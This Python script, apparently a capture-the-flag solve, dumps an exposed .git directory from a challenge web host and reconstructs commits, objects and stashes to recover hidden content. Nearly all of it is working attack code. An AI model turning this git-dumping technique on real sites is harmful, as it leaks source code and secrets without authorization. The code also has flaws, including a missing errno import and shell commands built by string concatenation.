import requests
import os
import subprocess

LOGFILE = ".git/logs/HEAD"
OBJ_DIR = ".git/objects/"
URL_BASE = "http://dangit.pwni.ng/.git/objects/"

# download ./git/logs/head
# download ./git/index
# download ./git/refs/heads/master
# create git directory with git init and create logs folder with HEAD file
# git cat-file -p [object]


# https://github.com/internetwache/GitTools
# git checkout . to get files back
# also check for stashes
# git reflog to see if anything was undone

def create_directory(directory):
	if not os.path.exists(directory):
		try:
			os.makedirs(directory)
		except OSError as exc: # Guard against race condition
			if exc.errno != errno.EEXIST:
				raise

def download_object(git_object):
	# Split object hash into parts
	git_dir = git_object[:2]
	git_file = git_object[2:]
	git_name = git_dir + "/" + git_file
	
	# Create directory in objects folder	
	create_directory(OBJ_DIR + git_dir)
		
	# Download file and store
	r = requests.get(URL_BASE + git_name)
	with open(OBJ_DIR + git_name, "wb") as obj:
		obj.write(r.content)
	
"""
with open(LOGFILE) as log:
	lines = log.readlines()
	for line in lines:
		download_object(line.split()[1])
"""
"""
proc = subprocess.Popen(["git fsck --full"], stdout=subprocess.PIPE, shell=True)
(out, err) = proc.communicate()

results = out.splitlines()
for result in results:
	tokens = result.split()
	if tokens[0] == "broken" and tokens[3] == "tree":
		download_object(tokens[4])
	elif tokens[0] == "to" and (tokens[1] == "tree" or tokens[1] == "blob"):
		download_object(tokens[2])
	elif tokens[0] == "missing":
		download_object(tokens[2])
		
"""
"""
proc = subprocess.Popen(["git log"], stdout=subprocess.PIPE, shell=True)
(out, err) = proc.communicate()

results = out.splitlines()
commits = []
for result in results:
	tokens = result.split()
	if len(tokens) == 2 and tokens[0] == "commit":
		commits.append(tokens[1])

for commit in commits:
	os.system("git reset --soft " + commit)
	proc = subprocess.Popen(["git show"], stdout=subprocess.PIPE, shell=True)
	(out, err) = proc.communicate()
	print(out)
"""
"""
proc = subprocess.Popen(["find .git/objects -type f"], stdout=subprocess.PIPE, shell=True)
(out, err) = proc.communicate()

gobjects = out.splitlines()
for gobject in gobjects:
	tokens = gobject.split("/")
	name = tokens[-2] + tokens[-1]
	proc = subprocess.Popen(["git cat-file -p " + name], stdout=subprocess.PIPE, shell=True)
	(out, err) = proc.communicate()
	print(out)
	print("-"*50)
"""
""" stash stuff 
commits = []
results = []
more_results = []
flag = []
os.system("cat logs/refs/stash > output.txt")
with open("output.txt") as data:
	for line in data.read().splitlines():
		line = line[line.index(" ")+1:]
		line = line[:line.index(" ")]
		commits.append(line)
	for commit in commits:
		os.system("git cat-file -p " + commit + " > output2.txt")
		with open("output2.txt") as data2:
			a = data2.read()
			results.append(a[a.index(" ")+1:a.index("\n")])
	for result in results:
		os.system("git cat-file -p " + result + " > output3.txt")
		with open("output3.txt") as data3:
			b = data3.read()
			more_results.append(b[b.index("8\n100644 blob ")+13:-6])
	more_results.reverse()
	for c in more_results:
		os.system("git cat-file -p " + c)
"""



